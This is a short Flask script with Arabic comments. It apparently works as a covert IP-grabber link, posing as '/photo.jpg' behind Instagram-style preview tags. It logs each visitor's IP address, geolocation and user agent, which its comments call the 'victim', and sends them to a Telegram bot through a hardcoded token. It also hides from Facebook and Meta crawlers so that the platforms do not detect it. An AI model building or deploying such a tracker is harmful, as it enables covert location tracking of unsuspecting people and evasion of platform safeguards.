from flask import Flask, request
import requests

app = Flask(__name__)

# إعداداتك الأصلية التي أثبتت نجاحها في الإرسال
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

@app.route('/')
@app.route('/photo.jpg') # المسار الحاسم للصيد الصامت
def track():
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ua_lower = user_agent.lower()

    # --- فلترة ذكية جداً لعدم كشف السيرفر ---
    # إذا كان الزائر بوت، نعطيه صفحة فارغة تماماً ولا نرسل لتليجرام
    is_bot = any(x in ua_lower for x in ['facebook', 'meta', 'amazon', 'vercel', 'bot', 'spider'])
    if is_bot or ip_address.startswith(("66.220.", "31.13.")):
        return "", 200 # صفحة بيضاء فارغة للبوت

    # سحب البيانات للضحية الحقيقية فقط
    try:
        geo = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        loc = f"{geo.get('city')}, {geo.get('country')}"
    except:
        loc = "Unknown"

    msg = (
        f"🌟 <b>Silent Hit!</b>\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>LOC:</b> {loc}\n"
        f"📱 <b>UA:</b> {user_agent[:40]}..."
    )
    send_to_telegram(msg)
    
    # الرد بـ Meta Tags "بريئة" جداً لا تثير شكوك انستقرام
    return """
    <html>
    <head>
        <meta property="og:title" content="Verified Content">
        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
        <meta property="og:type" content="article">
    </head>
    <body style="background:white;"></body>
    </html>
    """, 200

if __name__ == '__main__':
    app.run()
